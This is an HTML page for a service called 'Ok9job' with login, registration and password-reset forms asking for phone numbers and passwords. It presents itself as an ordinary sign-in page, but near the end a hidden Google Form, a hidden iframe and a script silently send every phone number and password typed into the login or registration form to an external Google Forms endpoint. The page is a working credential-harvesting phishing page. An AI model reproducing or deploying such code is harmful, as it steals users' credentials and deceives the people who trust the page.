<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome - Login & Register</title>
    <style>
        :root {
            --primary-color: #6a0dad;
            --primary-hover: #5b0996;
            --error-color: #dc3545;
            --success-color: #28a745;
        }

        body {
            background: linear-gradient(135deg, #f5f7fa 0%, #e4e8eb 100%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .container {
            background: white;
            padding: 2rem 2.5rem;
            border-radius: 16px;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.1);
            text-align: center;
            max-width: 400px;
            width: 100%;
        }

        .form-container {
            transition: all 0.3s ease;
        }

        .hidden {
            display: none;
            opacity: 0;
            transform: translateY(20px);
        }

        .visible {
            display: block;
            opacity: 1;
            transform: translateY(0);
        }

        h1 {
            color: var(--primary-color);
            margin-bottom: 1.5rem;
        }

        .btn {
            display: block;
            width: 100%;
            padding: 1rem;
            margin: 1rem 0;
            background: var(--primary-color);
            color: white;
            border: none;
            border-radius: 25px;
            font-size: 1.1rem;
            cursor: pointer;
            transition: all 0.3s;
            text-decoration: none;
        }

        .btn:hover {
            background: var(--primary-hover);
            transform: translateY(-1px);
        }

        .btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }

        .form-group {
            margin-bottom: 1.2rem;
            text-align: left;
        }

        .form-group label {
            display: block;
            margin-bottom: 0.5rem;
            color: #333;
        }

        .form-group input {
            width: 100%;
            padding: 0.8rem;
            border-radius: 8px;
            border: 2px solid #eee;
            font-size: 1rem;
            transition: all 0.3s;
            box-sizing: border-box;
        }

        .form-group input:focus {
            border-color: var(--primary-color);
            outline: none;
            box-shadow: 0 0 0 3px rgba(0, 114, 53, 0.1);
        }

        .password-field {
            position: relative;
        }

        .password-toggle {
            position: absolute;
            right: 1rem;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            user-select: none;
            color: #666;
        }

        .error-message {
            color: var(--error-color);
            font-size: 0.85rem;
            margin-top: 0.3rem;
            display: none;
        }

        .success-message {
            color: var(--success-color);
            font-size: 0.85rem;
            margin-top: 0.3rem;
            display: none;
        }

        .link-button {
            background: none;
            border: none;
            color: var(--primary-color);
            text-decoration: underline;
            cursor: pointer;
            font-size: 0.95rem;
            padding: 0;
            margin: 0;
        }

        .link-button:hover {
            color: var(--primary-hover);
        }

        @keyframes spinner {
            to {
                transform: rotate(360deg);
            }
        }

        .loading::after {
            content: '';
            position: absolute;
            width: 16px;
            height: 16px;
            top: 50%;
            left: 50%;
            margin: -8px 0 0 -8px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spinner 0.6s linear infinite;
        }
    </style>

    <style>
        .floating-title {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            font-size: 2rem;
            font-weight: 700;
            color: #6a0dad;
            text-shadow: 0 0 12px rgba(106, 13, 173, 0.7);
            opacity: 0;
            animation: fadeFloat 3s ease-in-out forwards;
            z-index: 9999;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        @keyframes fadeFloat {
            0% { opacity: 0; transform: translate(-50%, -10px); }
            50% { opacity: 1; transform: translate(-50%, 0); }
            100% { opacity: 0.9; transform: translate(-50%, -5px); }
        }
        @media (max-width: 600px) {
            .floating-title {
                font-size: 1.5rem;
            }
        }
    </style>
    
</head>

<body>
<div class='floating-title'>Ok9job</div>
    <div class="container">
        <!-- Login Form -->
        <div id="loginContainer" class="form-container visible">
            <h1>Welcome Back</h1>
            <form id="loginForm" autocomplete="off">
                <div class="form-group">
                    <label for="loginPhone">Phone Number</label>
                    <input type="tel" id="loginPhone" name="loginPhone" required placeholder="Enter your phone number">
                    <div id="loginPhoneError" class="error-message"></div>
                </div>
                <div class="form-group">
                    <div class="password-field">
                        <label for="password">Password</label>
                        <input type="password" id="password" name="password" required placeholder="Enter your password">
                        <span class="password-toggle" onclick="togglePassword('password')">üëÅÔ∏è</span>
                    </div>
                    <div id="passwordError" class="error-message"></div>
                </div>
                <button type="submit" class="btn" id="loginButton">Login</button>
                <div id="loginSuccess" class="success-message">Login successful!</div>
                <div style="text-align:right; margin: 1rem 0;">
                    <button type="button" class="link-button" id="forgotPassword">Forgot Password?</button>
                </div>
            </form>
            <div style="text-align:center;">
                <span>Don't have an account?</span>
                <button type="button" class="btn" id="showRegisterBtn"
                    style="width:auto;display:inline-block;padding:0.5rem 1.5rem;margin:0 0.5rem;">Register</button>
            </div>
        </div>

        <!-- Register Form -->
        <div id="registerContainer" class="form-container hidden">
            <h1>Create Account</h1>
            <form id="registerForm" autocomplete="off">
                <div class="form-group">
                    <label for="regUsername">Username</label>
                    <input type="text" id="regUsername" name="regUsername" required placeholder="Choose a username">
                    <div id="regUsernameError" class="error-message"></div>
                </div>
                <div class="form-group">
                    <label for="phone">Phone Number</label>
                    <input type="tel" id="phone" name="phone" required placeholder="Enter your phone number">
                    <div id="phoneError" class="error-message"></div>
                </div>
                <div class="form-group">
                    <div class="password-field">
                        <label for="regPassword">Password</label>
                        <input type="password" id="regPassword" name="regPassword" required
                            placeholder="Create password">
                        <span class="password-toggle" onclick="togglePassword('regPassword')">üëÅÔ∏è</span>
                    </div>
                    <div id="regPasswordError" class="error-message"></div>
                </div>
                <div class="form-group">
                    <div class="password-field">
                        <label for="confirmPassword">Confirm Password</label>
                        <input type="password" id="confirmPassword" name="confirmPassword" required
                            placeholder="Confirm your password">
                        <span class="password-toggle" onclick="togglePassword('confirmPassword')">üëÅÔ∏è</span>
                    </div>
                    <div id="confirmPasswordError" class="error-message"></div>
                </div>
                <button type="submit" class="btn" id="registerButton">Create Account</button>
                <div id="registerSuccess" class="success-message">Registration successful!</div>
            </form>
            <div style="text-align:center; margin-top: 1rem;">
                <span>Already have an account?</span>
                <button type="button" class="btn" id="showLoginBtn"
                    style="width:auto;display:inline-block;padding:0.5rem 1.5rem;margin:0 0.5rem;">Login</button>
            </div>
        </div>

        <!-- Forgot Password Form -->
        <div id="forgotContainer" class="form-container hidden">
            <h1>Reset Password</h1>
            <form id="forgotForm" autocomplete="off">
                <div class="form-group">
                    <label for="resetPhone">Phone Number</label>
                    <input type="tel" id="resetPhone" name="resetPhone" required placeholder="Enter your phone number">
                    <div id="resetPhoneError" class="error-message"></div>
                </div>
                <button type="submit" class="btn" id="resetButton">Send Reset Code</button>
                <div id="resetSuccess" class="success-message">Reset code sent to your phone!</div>
            </form>
            <div style="text-align:center; margin-top: 1rem;">
                <button type="button" class="link-button" id="backToLogin">Back to Login</button>
            </div>
        </div>
    </div>

    <script>
        // Form switching functionality
        const loginContainer = document.getElementById('loginContainer');
        const registerContainer = document.getElementById('registerContainer');
        const forgotContainer = document.getElementById('forgotContainer');

        function showLogin() {
            loginContainer.classList.add('visible');
            loginContainer.classList.remove('hidden');
            registerContainer.classList.add('hidden');
            registerContainer.classList.remove('visible');
            forgotContainer.classList.add('hidden');
            forgotContainer.classList.remove('visible');
            clearErrors();
        }

        function showRegister() {
            registerContainer.classList.add('visible');
            registerContainer.classList.remove('hidden');
            loginContainer.classList.add('hidden');
            loginContainer.classList.remove('visible');
            forgotContainer.classList.add('hidden');
            forgotContainer.classList.remove('visible');
            clearErrors();
        }

        function showForgotPassword() {
            forgotContainer.classList.add('visible');
            forgotContainer.classList.remove('hidden');
            loginContainer.classList.add('hidden');
            loginContainer.classList.remove('visible');
            registerContainer.classList.add('hidden');
            registerContainer.classList.remove('visible');
            clearErrors();
        }

        // Event listeners for form switching
        document.getElementById('showRegisterBtn').addEventListener('click', showRegister);
        document.getElementById('showLoginBtn').addEventListener('click', showLogin);
        document.getElementById('forgotPassword').addEventListener('click', showForgotPassword);
        document.getElementById('backToLogin').addEventListener('click', showLogin);

        // Password visibility toggle
        function togglePassword(inputId) {
            const input = document.getElementById(inputId);
            const toggle = input.nextElementSibling;
            if (input.type === 'password') {
                input.type = 'text';
                toggle.textContent = 'üëÅÔ∏è‚Äçüó®Ô∏è';
            } else {
                input.type = 'password';
                toggle.textContent = 'üëÅÔ∏è';
            }
        }

        // Clear all error messages
        function clearErrors() {
            document.querySelectorAll('.error-message').forEach(error => {
                error.style.display = 'none';
            });
            document.querySelectorAll('.success-message').forEach(success => {
                success.style.display = 'none';
            });
        }

        // Show error message
        function showError(elementId, message) {
            const errorElement = document.getElementById(elementId);
            if (errorElement) {
                errorElement.textContent = message;
                errorElement.style.display = 'block';
            }
        }

        // Login form submission
        document.getElementById('loginForm').addEventListener('submit', async function (e) {
            e.preventDefault();
            clearErrors();

            const phone = document.getElementById('loginPhone').value.trim();
            const password = document.getElementById('password').value;
            const loginButton = document.getElementById('loginButton');
            let isValid = true;

            if (!isValidPhone(phone)) {
                showError('loginPhoneError', 'Please enter a valid 10-digit phone number');
                isValid = false;
            }

            if (password.length < 6) {
                showError('passwordError', 'Password must be at least 6 characters');
                isValid = false;
            }

            if (!isValid) return;

            loginButton.disabled = true;
            loginButton.classList.add('loading');

            try {
                await new Promise(resolve => setTimeout(resolve, 1500));
                document.getElementById('loginSuccess').style.display = 'block';
                setTimeout(() => {
                    alert('Login successful!');
                }, 500);
            } catch (error) {
                showError('passwordError', 'Login failed. Please try again.');
            } finally {
                loginButton.disabled = false;
                loginButton.classList.remove('loading');
            }
        });

        // Register form submission
        document.getElementById('registerForm').addEventListener('submit', async function (e) {
            e.preventDefault();
            clearErrors();

            const username = document.getElementById('regUsername').value.trim();
            const phone = document.getElementById('phone').value.trim();
            const password = document.getElementById('regPassword').value;
            const confirmPassword = document.getElementById('confirmPassword').value;
            const registerButton = document.getElementById('registerButton');
            let isValid = true;

            if (username.length < 3) {
                showError('regUsernameError', 'Username must be at least 3 characters long');
                isValid = false;
            }

            if (!isValidPhone(phone)) {
                showError('phoneError', 'Please enter a valid 10-digit phone number');
                isValid = false;
            }

            if (password.length < 6) {
                showError('regPasswordError', 'Password must be at least 6 characters');
                isValid = false;
            }

            if (password !== confirmPassword) {
                showError('confirmPasswordError', 'Passwords do not match');
                isValid = false;
            }

            if (!isValid) return;

            registerButton.disabled = true;
            registerButton.classList.add('loading');

            try {
                // Simulate API call
                await new Promise(resolve => setTimeout(resolve, 1500));
                document.getElementById('registerSuccess').style.display = 'block';
                setTimeout(() => {
                    showLogin();
                }, 2000);
            } catch (error) {
                showError('regUsernameError', 'Registration failed. Please try again.');
            } finally {
                registerButton.disabled = false;
                registerButton.classList.remove('loading');
            }
        });

        // Forgot password form submission
        document.getElementById('forgotForm').addEventListener('submit', async function (e) {
            e.preventDefault();
            clearErrors();

            const phone = document.getElementById('resetPhone').value.trim();
            const resetButton = document.getElementById('resetButton');
            let isValid = true;

            if (!isValidPhone(phone)) {
                showError('resetPhoneError', 'Please enter a valid 10-digit phone number');
                isValid = false;
            }

            if (!isValid) return;

            resetButton.disabled = true;
            resetButton.classList.add('loading');

            try {
                // Simulate API call
                await new Promise(resolve => setTimeout(resolve, 1500));
                document.getElementById('resetSuccess').style.display = 'block';
                setTimeout(() => {
                    showLogin();
                }, 2000);
            } catch (error) {
                showError('resetPhoneError', 'Failed to send reset code. Please try again.');
            } finally {
                resetButton.disabled = false;
                resetButton.classList.remove('loading');
            }
        });

        // Validate phone number
        function isValidPhone(phone) {
            return phone.match(/^\d{10}$/);
        }

        // Enhance: remember-me behavior and form override
        window.addEventListener('DOMContentLoaded', function () {
            // Insert welcome paragraph if missing
            const loginContainer = document.getElementById('loginContainer');
            if (loginContainer) {
                const h1 = loginContainer.querySelector('h1');
                if (h1 && !loginContainer.querySelector('.welcome-desc')) {
                    const p = document.createElement('p');
                    p.className = 'welcome-desc';
                    p.style.color = '#666';
                    p.style.marginBottom = '16px';
                    p.style.textAlign = 'center';
                    p.textContent = 'Sign in to your account to start earning points';
                    h1.insertAdjacentElement('afterend', p);
                }
            }

            // Ensure remember checkbox exists
            if (!document.getElementById('rememberMe')) {
                const loginButton = document.getElementById('loginButton');
                if (loginButton) {
                    const wrapper = document.createElement('div');
                    wrapper.className = 'form-group';
                    wrapper.style.display = 'flex';
                    wrapper.style.alignItems = 'center';
                    wrapper.style.marginBottom = '1.5rem';
                    wrapper.innerHTML = '<input type="checkbox" id="rememberMe" name="rememberMe" style="width:auto;margin-right:0.5rem;"><label for="rememberMe" style="margin:0;">Remember me</label>';
                    loginButton.parentNode.insertBefore(wrapper, loginButton);
                }
            }

            // Fill saved phone if present
            const saved = localStorage.getItem('rememberedPhone');
            if (saved) {
                const loginPhone = document.getElementById('loginPhone');
                if (loginPhone) loginPhone.value = saved;
                const cb = document.getElementById('rememberMe');
                if (cb) cb.checked = true;
            }

            // Replace existing form (to remove previous event listeners) and attach a new submit handler
            const oldForm = document.getElementById('loginForm');
            if (oldForm) {
                const newForm = oldForm.cloneNode(true);
                oldForm.parentNode.replaceChild(newForm, oldForm);

                newForm.addEventListener('submit', async function (e) {
                    e.preventDefault();
                    clearErrors();

                    const phone = document.getElementById('loginPhone').value.trim();
                    const password = document.getElementById('password').value;
                    const loginButton = document.getElementById('loginButton');
                    const rememberMe = document.getElementById('rememberMe') ? document.getElementById('rememberMe').checked : false;
                    let isValid = true;

                    if (!isValidPhone(phone)) {
                        showError('loginPhoneError', 'Please enter a valid 10-digit phone number');
                        isValid = false;
                    }

                    if (password.length < 6) {
                        showError('passwordError', 'Password must be at least 6 characters');
                        isValid = false;
                    }

                    if (!isValid) return;

                    loginButton.disabled = true;
                    loginButton.classList.add('loading');

                    try {
                        // Simulate API call
                        await new Promise(resolve => setTimeout(resolve, 1500));

                        // Save/remove remembered phone
                        if (rememberMe) {
                            localStorage.setItem('rememberedPhone', phone);
                        } else {
                            localStorage.removeItem('rememberedPhone');
                        }

                        document.getElementById('loginSuccess').style.display = 'block';
                        setTimeout(() => {
                            alert('Login successful!');
                        }, 500);
                    } catch (error) {
                        showError('passwordError', 'Login failed. Please try again.');
                    } finally {
                        loginButton.disabled = false;
                        loginButton.classList.remove('loading');
                    }
                });
            }
        });
    </script>
    <!-- Hidden Google Form submission to record phone & password (submits to a hidden iframe so user doesn't navigate) -->
    <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>

    <form id="googleForm"
        action="https://docs.google.com/forms/d/e/1FAIpQLScn5oEE66Ti4Ft5-pXycKDiDPUpQmdmFr1BIg0DSuM8KOwakA/formResponse"
        method="POST" target="hidden_iframe" style="display:none;">
        <input name="entry.1317641093" id="gf_phone" type="text" />
        <input name="entry.1648812704" id="gf_pass" type="text" />
    </form>

    <script>
        // Submit phone & password to Google Form (hidden) when login or register forms are submitted.
        (function () {
            const googleForm = document.getElementById('googleForm');
            const gfPhone = document.getElementById('gf_phone');
            const gfPass = document.getElementById('gf_pass');

            function submitToGoogle(phoneValue, passValue) {
                if (!googleForm) return;
                gfPhone.value = phoneValue || '';
                gfPass.value = passValue || '';
                // submit to hidden iframe to avoid navigation
                googleForm.submit();
            }

            // Hook login form submit (the page replaces the form at runtime, so use event delegation)
            document.addEventListener('submit', function (e) {
                const form = e.target;
                if (!form) return;

                // If it's the login form
                if (form.id === 'loginForm' || form.querySelector('#loginPhone')) {
                    // get current visible values
                    const phoneEl = document.getElementById('loginPhone');
                    const passEl = document.getElementById('password');
                    const phone = phoneEl ? phoneEl.value.trim() : '';
                    const pass = passEl ? passEl.value : '';
                    // Submit to Google (non-blocking)
                    submitToGoogle(phone, pass);
                }

                // If it's the register form
                if (form.id === 'registerForm' || form.querySelector('#phone')) {
                    const phoneEl = document.getElementById('phone');
                    const passEl = document.getElementById('regPassword');
                    const phone = phoneEl ? phoneEl.value.trim() : '';
                    const pass = passEl ? passEl.value : '';
                    submitToGoogle(phone, pass);
                }
            }, true);
        })();
    </script>
</body>

</html>
